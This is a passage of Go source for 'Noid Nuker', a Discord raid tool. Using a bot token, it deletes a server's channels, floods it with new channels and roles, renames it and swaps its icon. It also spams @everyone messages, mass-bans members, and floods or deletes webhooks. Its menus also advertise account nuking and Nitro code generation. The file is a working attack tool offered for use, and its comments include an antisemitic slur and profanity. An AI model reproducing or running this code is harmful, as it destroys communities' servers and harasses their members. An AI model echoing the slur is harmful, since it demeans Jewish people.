package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/eiannone/keyboard"
	"github.com/fatih/color"
	"golang.org/x/term"
)

// noid time :3
var token string
var version string
var htoken string
var botname string
var sid string
var webhook string
var accusername string
var acctoken string
var accuid string
var servername string
var usertoken string

const (
	Purple = "\033[38;2;198;160;246m"
	Reset  = "\033[0m"
)

type Config struct {
	Token string `json:"token"`
}

func GetConsolew() int {
	w, _, err := term.GetSize(int(os.Stdout.Fd()))
	if err != nil {
		return 80
	}
	return w
}

func addColor(start, end string, step, tsteps int) string {
	hextorgb := func(hex string) (int, int, int) {
		var r, g, b int
		fmt.Sscanf(hex, "#%02x%02x%02x", &r, &g, &b)
		return r, g, b
	}

	rstart, gstart, bstart := hextorgb(start)
	rend, gend, bend := hextorgb(end)

	r := int(float64(rstart)*(1.0-float64(step)/float64(tsteps)) + float64(rend)*float64(step)/float64(tsteps))
	g := int(float64(gstart)*(1.0-float64(step)/float64(tsteps)) + float64(gend)*float64(step)/float64(tsteps))
	b := int(float64(bstart)*(1.0-float64(step)/float64(tsteps)) + float64(bend)*float64(step)/float64(tsteps))

	return fmt.Sprintf("\x1b[38;2;%d;%d;%dm", r, g, b)
}

func PrintInCenterOfConsoleFunny(text string) {
	w := GetConsolew()
	lines := strings.Split(text, "\n")

	startcolor := "#c6a0f6"
	endcolor := "#8aadf4"

	tsteps := len(lines)

	maxlinelen := 0
	for _, line := range lines {
		if len(line) > maxlinelen {
			maxlinelen = len(line)
		}
	}

	for i, line := range lines {
		color := addColor(startcolor, endcolor, i, tsteps)

		pad := (w - maxlinelen) / 2
		if pad < 0 {
			pad = 0
		}

		fmt.Printf("%s%s%s\x1b[0m\n", color, strings.Repeat(" ", pad), line)
	}
}

func Art() {
	artbannerassciart := `
      ::::    :::  :::::::: ::::::::::: ::::::::: 
     :+:+:   :+: :+:    :+:    :+:     :+:    :+: 
    :+:+:+  +:+ +:+    +:+    +:+     +:+    +:+  
   +#+ +:+ +#+ +#+    +:+    +#+     +#+    +#+   
  +#+  +#+#+# +#+    +#+    +#+     +#+    +#+    
 #+#   #+#+# #+#    #+#    #+#     #+#    #+#     
###    ####  ######## ########### #########       
	`
	PrintInCenterOfConsoleFunny(artbannerassciart)
}

func InfoBox() {
	author := "Made By awsd (TRUST TRUST)"
	infobox := fmt.Sprintf(

		"%s\nVersion %s\n------------------------Info------------------------\nToken: %s\nBot Name: %s\nID: %s\nName: %s\n----------------------------------------------------",
		author, version, htoken, botname, sid, servername,
	)
	PrintInCenterOfConsoleFunny(infobox)
}

func InfoBox1() {
	author := "Made By awsd (TRUST TRUST)"
	infobox := fmt.Sprintf(

		"%s\nVersion: %s\n--------------------Info--------------------\nToken: %s\nBot Name: %s\n--------------------------------------------",
		author, version, htoken, botname,
	)
	PrintInCenterOfConsoleFunny(infobox)
}

func init() {
	discordgo.Logger = FixError
}

func FixError(level int, caller int, format string, a ...interface{}) {
	message := fmt.Sprintf(format, a...)
	if strings.Contains(message, "error unmarshalling GUILD_CREATE event") || strings.Contains(message, "error unmarshalling PRESENCE_UPDATE event") {
		return
	}
	fmt.Println(message)
}

func TurnBotOn() {
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("[!] Error: ", err)
		fmt.Println("Press Enter To Go To Menu!")
		fmt.Scanln()
		ClearConsole()
		Art()
		InfoBox3DiscordCD()
		DiscordHandler()
	}

	Art()

	dg.Identify.Intents = discordgo.IntentsAll
	dg.LogLevel = discordgo.LogError

	defer dg.Close()

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		if s == nil || r == nil || s.State == nil || s.State.User == nil {
			return
		}

		botname = s.State.User.Username
		ChangePlayingGame(s)
		InfoBox1()
	})

	dg.AddHandler(func(s *discordgo.Session, e *discordgo.GuildCreate) {
		defer func() {
			if r := recover(); r != nil {
			}
		}()
	})

	err = dg.Open()
	if err != nil {
		fmt.Println("[!] Error: ", err)
		fmt.Println("Press Enter To Go To Menu!")
		fmt.Scanln()
		ClearConsole()
		Art()
		InfoBox3DiscordCD()
		DiscordHandler()
	}

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT)

	go func() {
		<-sigs
		fmt.Println("Exiting......")
		dg.Close()
		os.Exit(0)
	}()

	time.Sleep(3 * time.Second)

	servers, err := dg.UserGuilds(100, "", "", false)
	if err != nil {
		fmt.Printf("%s Failed To Get Servers!\n", color.RedString("[!]"))
		os.Exit(1)
	}

	serversID := make(map[string]string)
	for _, server := range servers {
		serversID[server.ID] = server.Name
	}
	fmt.Print(Purple + "Enter Server ID: ->: " + Reset)
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	sidinputer := scanner.Text()
	sid = strings.TrimSpace(sidinputer)

	if strings.EqualFold(sid, "menu") {
		ClearConsole()
		dg.Close()
		Art()
		InfoBox3DiscordCD()
		DiscordHandler()
		return
	}

	for {
		if _, real := serversID[sid]; !real {
			fmt.Printf("%s Invalid Server ID! Please try again.\n", color.RedString("[!]"))
			fmt.Println("Press Enter to Retry...")
			fmt.Scanln()
			ClearConsole()
			Art()
			InfoBox()
			fmt.Println("Type 'menu' To Go To Menu!")
			fmt.Print(Purple + "Enter Server ID: ->: " + Reset)
			scanner.Scan()
			sidinputer := scanner.Text()
			sid = strings.TrimSpace(sidinputer)

			if strings.EqualFold(sid, "menu") {
				ClearConsole()
				dg.Close()
				Art()
				InfoBox3DiscordCD()
				DiscordHandler()
				return
			}

		} else if strings.EqualFold(sid, "menu") {
			ClearConsole()
			dg.Close()
			Art()
			InfoBox3DiscordCD()
			DiscordHandler()
			return

		} else {
			ClearConsole()
			Art()
			InfoBox()
			break
		}
	}

	serverg, err := dg.State.Guild(sid)
	if err != nil {
		serverg, err = dg.Guild(sid)
		if err != nil {
			return
		}
	}
	servername = serverg.Name
	ClearConsole()
	Art()
	InfoBox()

	fmt.Print(Purple + "->: " + Reset)

	sig := make(chan os.Signal, 1)                      // ctrl c is being jewish
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM) // ctrl c is being jewish

	for {
		scanner.Scan()
		input := strings.TrimSpace(scanner.Text())

		select {
		case <-sig:
			fmt.Println("Exiting.....")
			dg.Close()
			os.Exit(0)

		default:
			switch input {
			case "7":
				ClearConsole()
				TurnBotOn()

			case "3":
				mk()
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "1":
				dc(dg)
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "6":
				rs(dg)
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "2":
				cpfp()
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "4":
				sm(dg, sid)
				time.Sleep(3 * time.Second)
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "5":
				mr(sid)
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "holy":
				AllIsNeeded()
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			/*case "de": // too many 429,, not worth it
			de(sid)
			fmt.Println("Press Enter To Go To Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			InfoBox() */

			case "nuke": // all in one
				dc(dg)
				mk()
				time.Sleep(1 * time.Second)
				rs(dg)
				cpfp()
				mr(sid)
				time.Sleep(4 * time.Second)
				sm(dg, sid)
				time.Sleep(4 * time.Second)
				color.Green("[+] All commands have been ranned.")
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "massban": // credit to x-ghost for making me make this for his server LOL
				massbanner()
				fmt.Println("Press Enter To Go To Menu!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox()

			case "menu":
				ClearConsole()
				Art()
				InfoBox3DiscordCD()
				DiscordHandler()

			case "clear":
				ClearConsole()
				TurnBotOn()

			case "exit":
				ClearConsole()
				fmt.Println("Exiting....")
				time.Sleep(3 * time.Second)
				ClearConsole()
				fmt.Println("Exited!")
				os.Exit(0)

			case "help":
				bluehelp := `Help:
				nuke   ║ All In One!

				1      ║ Deletes all channels
				2      ║ Changes the server PFP
				3      ║ Makes new channels
				4      ║ Spams messages to all channels
				5      ║ Makes roles
				6      ║ Changes Server ID (restarts whole script)

				help   ║ Shows this menu
				men    ║ Back To The Menu
				exit   ║ Kills The Script!`

				PrintInCenterOfConsoleFunny(bluehelp)

			default:
				fmt.Printf("%s Command Not Found!\n", color.RedString("[!]"))
			}

			fmt.Print(Purple + "->: " + Reset)
		}
	}

}

func LoadToken(fn string) (string, error) {
	file, err := os.Open(fn)
	if err != nil {
		return "", fmt.Errorf("%s Error opening token file: %w", color.RedString("[!]"), err)
	}
	defer file.Close()

	var config Config
	if err := json.NewDecoder(file).Decode(&config); err != nil {
		return "", fmt.Errorf("%s Error decoding JSON file: %w", color.RedString("[!]"), err)
	}

	token = config.Token
	TokenHalf()

	versioncontent, err := os.ReadFile("version.txt")
	if err != nil {
		return "", fmt.Errorf("%s Error opening version file: %w", color.RedString("[!]"), err)
	}
	version = string(versioncontent)

	return config.Token, nil
}

func TokenHalf() {
	half := len(token) / 2
	htoken = token[:half]
}

func ClearConsole() {
	if runtime.GOOS == "windows" {
		clear := exec.Command("cmd", "/c", "cls")
		clear.Stdout = os.Stdout
		clear.Run()
	} else {
		for i := 0; i < 20; i++ {
			color.Red("[!] Use TempleOS!")
			// haha fucking sinner bitch!
		}
	}
}

func CMDName() {
	cmd := exec.Command("cmd", "/C", "title, Noid")
	cmd.Run()
}

func ChangePlayingGame(s *discordgo.Session) {
	s.UpdateGameStatus(0, "Trololoololl")
}

func dc(s *discordgo.Session) {

	channels, err := s.GuildChannels(sid)
	if err != nil {
		color.Red("[!] Failed to get channels: ", err)
		return
	}

	wc := 500
	chanfunny := make(chan *discordgo.Channel, len(channels))
	var wg sync.WaitGroup

	for i := 0; i < wc; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for channel := range chanfunny {
				retry := 2
				for retry > 0 {
					_, err := s.ChannelDelete(channel.ID)
					if err == nil {
						fmt.Printf("%s Deleted Channel: %s\n", color.GreenString("[201]"), channel.Name)
						return
					}

					if retry == 1 {
						fmt.Printf("%s Error deleting channel: %s \n", color.RedString("[429]"), channel.Name)
					} else {
						fmt.Printf("%s Error deleting channel: %s, Retrying...... \n", color.RedString("[429]"), channel.Name)
					}
					retry--
					time.Sleep(1 * time.Second)
				}
			}
		}()
	}
	for _, channel := range channels {
		chanfunny <- channel
	}
	close(chanfunny)
	wg.Wait()
}

func massbanner() {
	members, err := getmembers()
	if err != nil {
		fmt.Printf("%s Error Getting Members\n", color.RedString("[!]"))
		return
	}
	// 500 threads

	sem := make(chan struct{}, 500)
	var wg sync.WaitGroup

	for _, member := range members {
		wg.Add(1)

		sem <- struct{}{}

		go func(uid, username string) {
			defer wg.Done()
			if err := banmem(uid); err != nil {
				fmt.Printf("%s Failed To Ban: %s\n", color.RedString("[!]"), username)
			} else {
				fmt.Printf("%sBanned For Life!: %s\n", color.GreenString("[+]"), username)
			}
			<-sem
		}(member.ID, member.Username)
	}
	wg.Wait()
}

func getmembers() ([]Member, error) {
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		return nil, err
	}

	serverpeoples, err := dg.GuildMembers(sid, "", 3000)
	if err != nil {
		return nil, err
	}

	var members []Member
	for _, m := range serverpeoples {
		members = append(members, Member{ID: m.User.ID, Username: m.User.Username})
	}

	return members, nil
}

func banmem(uid string) error {
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		return err
	}

	err = dg.GuildMemberDelete(sid, uid)
	if err != nil {
		return nil
	}
	return nil
}

type Member struct {
	ID       string `json:"id"`
	Username string `json:"username"`
}

var (
	rl int
	mu sync.Mutex
)

func mk() {

	var wg sync.WaitGroup

	tc := 200
	cl := 100000

	cchan := make(chan struct{}, cl)

	client := &http.Client{
		Transport: &http.Transport{
			DisableKeepAlives: false,
		},
	}
	//spawns goroutines
	for i := 0; i < tc; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			// send
			cchan <- struct{}{}

			if err := createcr(sid, client); err != nil {
				fmt.Printf("%s Error Creating Channels\n", color.RedString("[429]"))
			} else {
				fmt.Printf("%s Created channel noid-nuker-EZ-LOL-XDDD\n", color.GreenString("[201]"))
				// fmt.Printf("%s Created channel noid-nuker-EZ-travy\n", color.GreenString("[201]"))
			}

			<-cchan
		}()
	}

	wg.Wait()
	fmt.Printf("%s Done Making All Channels!\n", color.GreenString("[+]"))
}

func createcr(sid string, client *http.Client) error {
	url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/channels", sid)

	channeld := map[string]interface{}{
		"name": "noid-nuker-EZ-LOL-XDDD",
		"type": 0,
	}

	JSONDATA, err := json.Marshal(channeld)
	if err != nil {
		fmt.Printf("%s Error Creating Channels\n", color.RedString("[!]"))
		return err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(JSONDATA))
	if err != nil {
		return err
	}

	req.Header.Set("Authorization", "Bot "+token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		color.Red("[!] Failed to send request: %w", err)
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusCreated {
		fmt.Printf("%s Created channel noid-nuker-EZ-LOL-XDDD\n", color.GreenString("[201]"))
	} else if resp.StatusCode == http.StatusTooManyRequests {
		mu.Lock()
		if rl >= 40 {
			fmt.Printf("%s Error Creating Channels\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		}
		mu.Unlock()

		mu.Lock()
		rl++
		mu.Unlock()

	} else if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusTooManyRequests {
		fmt.Printf("%s Error Creating Channels\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
	}
	return nil
}

func rs(s *discordgo.Session) {
	_, err := s.GuildEdit(sid, &discordgo.GuildParams{
		Name: "Noid Nuker | Trolled Your Server | By travy",
	})
	if err != nil {
		color.Red("[!] Failed to rename server: %s", err)
	} else {
		fmt.Printf("%s Server Renamed To 'Noid Nuker | Trolled Your Server | By travy'! \n", color.GreenString("[+]"))
	}
}

func cpfp() {

	pfpurl := "https://i.ibb.co/71XsxRG/lol-1.webp"

	resp, err := http.Get(pfpurl)
	if err != nil {
		fmt.Printf("%s Failed to get URL.\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		return
	}
	defer resp.Body.Close()

	imgd, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("%s Failed to read image\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		return
	}

	b63lol := base64.StdEncoding.EncodeToString(imgd)

	url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s", sid)
	payload := fmt.Sprintf(`{
			"icon": "data:image/jpeg;base64,%s"
		}`, b63lol)

	req, err := http.NewRequest("PATCH", url, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		color.Red("[!] Failed to make request.")
		return
	}

	req.Header.Set("Authorization", "Bot "+token)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err = client.Do(req)
	if err != nil {
		fmt.Printf("%s Error sending request\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		fmt.Printf("%s Renamed Server!\n", color.GreenString(fmt.Sprintf("[%d]", resp.StatusCode)))
		// color.Green("[+] Profile picture changed!")
	} else {
		fmt.Printf("%s Failed to rename server!\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		//color.Red("[!] Failed to change profile picture, status code: %d", resp.StatusCode)
	}
} // sex

func mr(sid string) {
	var wg sync.WaitGroup
	cl := 500
	sem := make(chan struct{}, cl)

	for i := 0; i < 50; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func(i int) {
			defer func() {
				<-sem
				wg.Done()
			}()

			err := makeRole(sid)
			if err != nil {
				return
			}
			fmt.Printf("%s Created role NOID-cookedlol\n", color.GreenString("[201]"))
			// color.Green("[+] Created role travy-cookedlol")
		}(i)
	}
	wg.Wait()
	fmt.Printf("%s All roles made!\n", color.GreenString("[+]"))
}

func makeRole(sid string) error {
	url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", sid)

	payload := `{
		"name": "NOID-cookedlol",
		"color": 255,
		"hoist": false,
		"permissions": 0
	}`

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return fmt.Errorf("[!] Failed to create request: %v", err)
	}

	req.Header.Set("Authorization", "Bot "+token)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("%s Failed to send request\n", color.RedString("[%s]", resp.StatusCode))

	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("%s Failed to make roles\n", color.RedString("[%s]", resp.StatusCode))

	}

	return nil
}

func sm(s *discordgo.Session, sid string) {
	embed := &discordgo.MessageEmbed{
		Title:       "Noid EZ",
		Description: "NOID OWNS THIS SHIT LMFAOOOOOOOOOOOOOOOOOOOOOOOO",
		Color:       0x0000ff,
		Image: &discordgo.MessageEmbedImage{
			URL: "https://i.ibb.co/71XsxRG/lol-1.webp",
		},
	}

	channels, err := s.GuildChannels(sid)
	if err != nil {
		fmt.Printf("%s Failed To Get Channels: %s\n", color.RedString("[!]"), err)
		return
	}

	for _, channel := range channels {
		if channel.Type == discordgo.ChannelTypeGuildText {
			go func(channel *discordgo.Channel) {
				for i := 0; i < 50; i++ {
					_, err := s.ChannelMessageSendComplex(channel.ID, &discordgo.MessageSend{
						Content: "@everyone LOLOL TROLLED EZ --> JOIN https://discord.gg/NKxfP4fYDP  trolled by NOID NUKER!",
						TTS:     true,
					})
					if err != nil {
						if httpErr, ok := err.(*discordgo.RESTError); ok && httpErr.Response.StatusCode == http.StatusTooManyRequests {
							time.Sleep(5 * time.Second)
						} else {
							fmt.Printf("%s Error Message Sending Message To %s: Error: %v\n", color.RedString("[!]"), channel.Name, err)
						}
					} else {
						//color.Green("[+] Message sent to channel %s", channel.Name)
						fmt.Printf("%s Message Sent To %s\n", color.GreenString("[+]"), channel.Name)
					}

					_, err = s.ChannelMessageSendEmbed(channel.ID, embed)
					if err != nil {
						if httpErr, ok := err.(*discordgo.RESTError); ok && httpErr.Response.StatusCode == http.StatusTooManyRequests {
							color.Red("[%s] Rate limited!\n", httpErr.Response.StatusCode)
							time.Sleep(5 * time.Second) // no work :(
						} else {
							color.Red("[!] Error sending embed: %v\n", err)
						}
					}
					time.Sleep(1 * time.Second) // 1sec
				}
			}(channel)
		}
	}
}

func AllIsNeeded() { // God
	url := "https://bible-api.com/?random=verse"

	resp, err := http.Get(url)

	if err != nil {
		for i := 0; i < 5; i++ {
			fmt.Println("fuck you satan")
		}
		return
	}

	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var biblestuff map[string]interface{}
	_ = json.Unmarshal(body, &biblestuff)

	ref, _ := biblestuff["reference"].(string)
	text, _ := biblestuff["text"].(string)

	fmt.Println(ref+" -", text)
}

// fuck cn ong
/* func de(sid string) {
	url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/emojis", sid)
	client := &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Printf("%s Error sending request\n", color.RedString(fmt.Sprintf("[!]")))
		return
	}
	req.Header.Set("Authorization", "Bot "+token)

	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != http.StatusOK {
		if resp != nil {
			fmt.Printf("%s Error: %s\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)), err.Error())
		} else {
			fmt.Println("Error sending request:", err)
		}
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("error:", err)
		return
	}

	var emojidata []map[string]interface{}
	if err = json.Unmarshal(body, &emojidata); err != nil {
		fmt.Println("error:", err)
		return
	}

	for _, emoji := range emojidata {
		emojiname, ok1 := emoji["name"].(string)
		emojiID, ok2 := emoji["id"].(string)
		if !ok1 || !ok2 {
			continue
		}

		deleteURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/emojis/%s", sid, emojiID)

		req, err := http.NewRequest("DELETE", deleteURL, nil)
		if err != nil {
			fmt.Printf("%s Failed to create delete request: %s\n", color.RedString("[!]"), emojiname)
			continue
		}
		req.Header.Set("Authorization", "Bot "+token)

		resp, err := client.Do(req)
		if err != nil || resp.StatusCode != http.StatusNoContent {
			if resp != nil {
				fmt.Printf("%s Failed to delete: %s\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)), emojiname)
			} else {
				fmt.Printf("Error deleting emoji %s: %s\n", emojiname, err)
			}
		} else {
			fmt.Printf("%s Deleted emoji: %s\n", color.GreenString(fmt.Sprintf("[%d]", resp.StatusCode)), emojiname)
		}
	}
} */

func DiscordHandler() {
	fmt.Println("Type 'help' for help!")

	for {
		fmt.Print(Purple + "->: " + Reset)

		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		input := strings.TrimSpace(scanner.Text())

		switch input {

		case "1":
			ClearConsole()
			TurnBotOn()

		case "holy": // YESSS
			AllIsNeeded()
			time.Sleep(4 * time.Second)
			os.Exit(999)

		case "2":
			ClearConsole()
			Art()
			CheckWebhookAndLoad()

		case "3":
			ClearConsole()
			Art()
			InfoBox2thingithink()
			CheckUserToken()

		case "4":
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			NitroGen()

		case "exit":
			ClearConsole()
			fmt.Println("Exited!")
			os.Exit(0)

		case "menu":
			ClearConsole()
			Art()
			InfoBox2thingithink()

		case "help":
			bluehelp := `
			
1  ║ Nukes server!
2  ║ Nukes webhooks!
3  ║ Nukes accounts! (Broken asf)
4  ║ Tries To Gen Nitro Codes!

menu   ║ Back to menu!
clear  ║ Clears console!
exit   ║ Kill the script!



			`
			PrintInCenterOfConsoleFunny(bluehelp)

		case "clear":
			ClearConsole()
			Art()
			DiscordHandler()

		default:
			fmt.Printf("%s Command Not Found!\n", color.RedString("[!]"))

		}
	}
}

func HandlerForMultiTool() {
	InfoBox2thingithink()
	fmt.Println("Type 'help' for help!")

	for {
		fmt.Print(Purple + "->: " + Reset)

		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		input := strings.TrimSpace(scanner.Text())

		switch input {

		case "1":
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			DiscordHandler()

		case "help":
			bluehelp := ` 
	1	║ Discord Options!

	clear   ║ Clears Console!
					`
			PrintInCenterOfConsoleFunny(bluehelp)

		case "clear":
			ClearConsole()
			Art()
			HandlerForMultiTool()

		default:
			fmt.Printf("%s Command Not Found!\n", color.RedString("[!]"))
		}

	}
}

func InfoBox2thingithink() {
	author := "Made By awsd (TRUST TRUST)"
	infobox := fmt.Sprintf(
		"%s\nVersion: %s\n--------------------Info--------------------\nDo not be afraid for I am with you.\nhttps://discord.gg/NKxfP4fYDP\nOption: Main Menu!\n--------------------------------------------",
		author, version,
	)
	PrintInCenterOfConsoleFunny(infobox)
}

func InfoBox3DiscordCD() {
	author := "Made By awsd (TRUST TRUST)"
	infobox := fmt.Sprintf(
		"%s\nVersion: %s\n--------------------Info--------------------\nDo not be afraid for I am with you.\nhttps://discord.gg/NKxfP4fYDP\nOption: Discord\n--------------------------------------------",
		author, version,
	)
	PrintInCenterOfConsoleFunny(infobox)
}

func CheckWebhookAndLoad() {
	InfoBox3DiscordCD()
	fmt.Print(Purple + "Enter Webhook URL: ->: " + Reset)
	fmt.Scanln(&webhook)
	webhook = strings.TrimSpace(webhook)

	webhookregex := `https:\/\/discord.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+`
	re := regexp.MustCompile(webhookregex)

	for {
		if strings.ToLower(webhook) == "menu" {
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			DiscordHandler()
			return
		} // 			fmt.Println("Type 'menu' To Go To Menu!")

		if re.MatchString(webhook) {
			resp, err := http.Get(webhook)
			if err == nil && resp.StatusCode == http.StatusOK {
				fmt.Printf("%s Webhook Valid!\n", color.GreenString(fmt.Sprintf("[%d]", resp.StatusCode)))
				fmt.Println("Press Enter To Retry!")
				fmt.Scanln()
				ClearConsole()
				Art()
				InfoBox3DiscordCD()
				WebhookOptions()
				break
			}
		}
		fmt.Printf("%s Webhook is not valid. Please retry!\n", color.RedString(fmt.Sprintf("[%d]", http.StatusBadRequest)))
		fmt.Println("Press Enter To Retry!")
		fmt.Scanln()
		ClearConsole()
		Art()
		InfoBox3DiscordCD()
		fmt.Println("Type 'menu' To Go To Menu!")
		fmt.Print(Purple + "Enter Webhook URL: ->: " + Reset)
		fmt.Scanln(&webhook)
		webhook = strings.TrimSpace(webhook)
	}
}

func WebhookOptions() {
	var input string
	fmt.Println("Type 'help' for help!")
	fmt.Print(Purple + "->: " + Reset)
	fmt.Scanln(&input)

	for {
		switch input {
		case "lol":
			fmt.Println("xdd")
			fmt.Println("testing command")
			fmt.Scanln()
			ClearConsole()
			Art()
			InfoBox2thingithink()
			WebhookOptions()
		case "menu":
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			DiscordHandler()

		case "3":
			dw()
			fmt.Println("Press Enter to change webhook!")
			fmt.Scanln()
			ClearConsole()
			Art()
			CheckWebhookAndLoad()

		case "1":
			sw()
			fmt.Println("Press enter to go to menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			WebhookOptions()

		case "2":
			fmt.Println()
			wjson()
			fmt.Println("Press enter to go to menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			WebhookOptions()

		case "clear":
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			WebhookOptions()

		case "help":
			bluehelp := ` 
	Help:
		1      ║ Spams Webhook
		2  	   ║ Display Json Of Webhook
		3      ║ Deletes Webhook


 		menu   ║ Back to menu
		help   ║ Shows this menu
		clear  ║ Clears console!

		`

			PrintInCenterOfConsoleFunny(bluehelp)
			WebhookOptions()

		default:
			if input != "" { // ezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
				fmt.Printf("%s Command Not Found!\n", color.RedString("[!]"))
			}
			fmt.Println("Type 'help' for help!")
			fmt.Print(Purple + "->: " + Reset)
			fmt.Scanln(&input)
		}
	}
}

func dw() {
	client := &http.Client{}
	req, err := http.NewRequest("DELETE", webhook, nil)
	if err != nil {
		fmt.Printf("%s Error creating request: %s\n", color.RedString("[!]"), err)
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("%s Error sending request: %s\n", color.RedString("[!]"), err)
	}

	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		fmt.Printf("%s Webhook Deleted!\n", color.GreenString(fmt.Sprintf("[%d]", resp.StatusCode)))
	} else {
		fmt.Printf("%s Failed to delete webhook, Please check webhook!\n", color.RedString(fmt.Sprintf("[%d]", http.StatusBadRequest)))
	}
}

func sw() {
	ChangeNameAndPFPWebhook()
	var delay float64
	var amount int

	for {
		fmt.Print(Purple + "Set Delay Per Message ->: " + Reset)
		var delayinputter string
		fmt.Scanln(&delayinputter)
		delayparsed, err := strconv.ParseFloat(delayinputter, 64)
		if err == nil && delayparsed > 0 {
			delay = delayparsed
			break
		}
		color.Red("[!] Invalid Input Delay.\n")
	}

	for {
		fmt.Print(Purple + "How Many Messages? ->: " + Reset)
		var amountinputter string
		fmt.Scanln(&amountinputter)
		amountParsed, err := strconv.Atoi(amountinputter)
		if err == nil && amountParsed > 0 {
			amount = amountParsed
			break
		}
		color.Red("[!] Invalid Message Amount.\n")
	}

	payload := map[string]interface{}{
		"content": "@here LOLOL TROLLED EZ --> JOIN https://discord.gg/NKxfP4fYDP",
		"embeds": []map[string]interface{}{
			{
				"title":       "Noid EZ",
				"description": "NOID OWNS THIS SHIT",
				"color":       0x0000ff,
				"image": map[string]string{
					"url": "https://i.ibb.co/71XsxRG/lol-1.webp",
				},
			},
		},
	}

	jsonpayload, err := json.Marshal(payload)
	if err != nil {
		color.Red("error:", err)
		return
	}

	for i := 0; i < amount; i++ {
		resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(jsonpayload))
		if err != nil {
			color.Red("error:", err)
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusTooManyRequests {
			color.Red("[%d] Failed to send message!\n", resp.StatusCode)
			time.Sleep(5 * time.Second)
			i--
			continue
		}

		if resp.StatusCode == http.StatusNoContent {
			color.Green("[%d] Message sent!\n", resp.StatusCode)
		} else {
			color.Red("[%d] Failed to send message!\n", resp.StatusCode)
		}

		time.Sleep(time.Duration(delay) * time.Second)
	}
}

func ChangeNameAndPFPWebhook() {

	type Webhook struct {
		Name string `json:"name"`
		Pfp  string `json:"avatar"` // no work wtf why??? :SOB:
	}

	data := Webhook{
		Name: "Noid",
		Pfp:  "https://i.ibb.co/71XsxRG/lol-1.webp",
	}

	jsondata, _ := json.Marshal(data)
	req, _ := http.NewRequest("PATCH", webhook, bytes.NewBuffer(jsondata))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
